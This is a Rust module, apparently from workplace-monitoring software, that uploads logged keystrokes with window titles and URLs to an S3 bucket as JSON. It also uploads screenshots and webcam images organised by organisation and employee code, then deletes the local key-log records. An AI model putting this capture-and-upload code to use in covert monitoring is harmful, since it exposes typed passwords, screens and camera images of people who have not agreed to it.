use aws_sdk_s3::{Client};
use aws_config::BehaviorVersion;
use aws_types::region::Region;
use rusqlite::Connection;
use std::path::{Path};
use std::error::Error;
use tokio::fs::File;
use tokio::io::AsyncReadExt;
use chrono::Local;
use serde::{Deserialize, Serialize};
use std::fs;
use std::collections::HashMap;
use log::{info, error};
use crate::orgdetails::orgdetails::get_org_details;

#[derive(Debug, Serialize, Deserialize)]
struct KeyLog {
    window_title: String,
    is_browser: bool,
    url: Option<String>,
    keys: String,
    datetime: String,
}

pub struct S3Uploader {
    client: Client,
    bucket: String,
}

impl S3Uploader {
    pub async fn new(region: String, bucket_name: &str, access_key: &str, secret_key: &str) -> Result<Self, Box<dyn Error>> {
        info!("Initializing S3 uploader with bucket: {}, region: {}", bucket_name, region);
        let region_provider = Region::new(region);

        // Create credentials provider
        let credentials = aws_sdk_s3::config::Credentials::new(
            access_key,
            secret_key,
            None, // session token
            None, // expiry
            "custom-credentials",
        );

        // Configure with credentials
        let config = aws_config::defaults(BehaviorVersion::latest())
            .region(region_provider)
            .credentials_provider(credentials)
            .load()
            .await;

        let client = Client::new(&config);
        info!("S3 client initialized successfully");

        Ok(Self {
            client,
            bucket: bucket_name.to_string(),
        })
    }
    
    async fn upload_object(&self, key: &str, contents: Vec<u8>) -> Result<(), Box<dyn Error>> {
        info!("Starting upload for object: {} (size: {} bytes)", key, contents.len());

        match self.client
            .put_object()
            .bucket(&self.bucket)
            .key(key)
            .body(contents.into())
            .content_type("application/octet-stream")
            .send()
            .await
        {
            Ok(_) => {
                info!("Successfully uploaded object: {}", key);
                Ok(())
            }
            Err(e) => {
                error!("Failed to upload object {}: {}", key, e);
                Err(Box::new(e))
            }
        }
    }

    pub async fn process_sqlite_data(&self, db_path: &str) -> Result<(), Box<dyn Error>> {
        info!("Processing SQLite data");

        let conn = Connection::open(db_path).map_err(|e| {
            error!("Failed to open SQLite database at {}: {}", db_path, e);
            e
        })?;

        let mut stmt = conn.prepare(
            "SELECT window_title, is_browser, url, keys, datetime 
             FROM key_logs 
             WHERE is_uploaded_to_server = 0"
        ).map_err(|e| {
            error!("Failed to prepare SQLite statement: {}", e);
            e
        })?;

        let logs: Vec<KeyLog> = stmt.query_map([], |row| {
            Ok(KeyLog {
                window_title: row.get(0)?,
                is_browser: row.get(1)?,
                url: row.get(2)?,
                keys: row.get(3)?,
                datetime: row.get(4)?,
            })
        })?.collect::<Result<_, _>>()?;

        info!("Found {} records to process", logs.len());

        if logs.is_empty() {
            info!("No new records to upload");
            return Ok(());
        }

        let json = serde_json::to_string(&logs)?;
        let now = Local::now();
        let folder_path = format!("{}/{}/{}/{}",
                                  get_org_details().get_org_code(),
                                  get_org_details().get_ecd(),
                                  now.format("%Y-%m-%d"),
                                  "Json"
        );
        let s3_key = format!("{}/logs-{}.json", folder_path,  now.format("%H-%M-%S"));

        match self.upload_object(&s3_key, json.into_bytes()).await {
            Ok(_) => {
                match conn.execute("DELETE from key_logs", []) {
                    Ok(deleted) => {
                        info!("Successfully cleared {} uploaded records", deleted);
                    },
                    Err(e) => {
                        error!("Failed to clear uploaded records: {}", e);
                        return Err(Box::new(e));
                    }
                }
            },
            Err(e) => {
                error!("Failed to upload JSON data: {}", e);
                return Err(e);
            }
        }

        Ok(())
    }

    pub async fn process_images(&self, screenshot_dir: &str, cam_dir: &str) -> Result<(), Box<dyn Error>> {
        info!("Processing images for account: {}", get_org_details().get_org_code());
        let now = Local::now();
        let date = now.format("%Y-%m-%d").to_string();

        info!("Processing screenshots from directory: {}", screenshot_dir);
        let screenshot_results = self.upload_directory(
            screenshot_dir,
            &format!("{}/{}/{}/Screenshot", get_org_details().get_org_code(), get_org_details().get_ecd(), date)
        ).await?;

        info!("Processing camera images from directory: {}", cam_dir);
        let cam_results = self.upload_directory(
            cam_dir,
            &format!("{}/{}/{}/Cam", get_org_details().get_org_code(), get_org_details().get_ecd(), date)
        ).await?;

        let screenshot_success = screenshot_results.values().all(|&v| v);
        let cam_success = cam_results.values().all(|&v| v);

        if !screenshot_success || !cam_success {
            error!("Upload failed - Screenshots: {}, Camera: {}", screenshot_success, cam_success);
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Not all files were uploaded successfully"
            )));
        }

        info!("Successfully processed all images");
        Ok(())
    }

    fn remove_dir_contents<P: AsRef<Path>>(path: P) -> std::io::Result<()> {
        info!("Removing contents of directory: {:?}", path.as_ref());
        for entry in fs::read_dir(&path)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                info!("Removing directory: {:?}", path);
                fs::remove_dir_all(&path)?;
            } else {
                info!("Removing file: {:?}", path);
                fs::remove_file(&path)?;
            }
        }
        Ok(())
    }

    async fn upload_directory(&self, dir_path: &str, prefix: &str)
                              -> Result<HashMap<String, bool>, Box<dyn Error>>
    {
        info!("Starting directory upload from {} to {}", dir_path, prefix);

        let dir_contents = fs::read_dir(dir_path)?;
        let files_count = dir_contents.count();
        info!("Found {} files in directory", files_count);
        
        let mut results = HashMap::new();
        let dir = fs::read_dir(dir_path)?;
        let mut total_files = 0;
        let mut successful_uploads = 0;

        for entry in dir {
            let entry = entry?;
            let path = entry.path();

            if path.is_file() {
                total_files += 1;
                let file_name = path.file_name()
                    .ok_or("Invalid filename")?
                    .to_string_lossy()
                    .into_owned();

                let s3_key = format!("{}/{}", prefix, file_name);
                let mut file = File::open(&path).await?;
                let mut contents = Vec::new();
                file.read_to_end(&mut contents).await?;

                info!("Uploading file: {} (size: {} bytes)", file_name, contents.len());

                match self.upload_object(&s3_key, contents).await {
                    Ok(_) => {
                        successful_uploads += 1;
                        results.insert(file_name.clone(), true);
                        info!("Successfully uploaded file: {}", file_name);
                    },
                    Err(e) => {
                        results.insert(file_name.clone(), false);
                        error!("Failed to upload file {}: {}", file_name, e);
                    }
                }
            }
        }

        info!("Directory upload completed - Total: {}, Successful: {}, Failed: {}", 
            total_files, successful_uploads, total_files - successful_uploads);

        Ok(results)
    }
}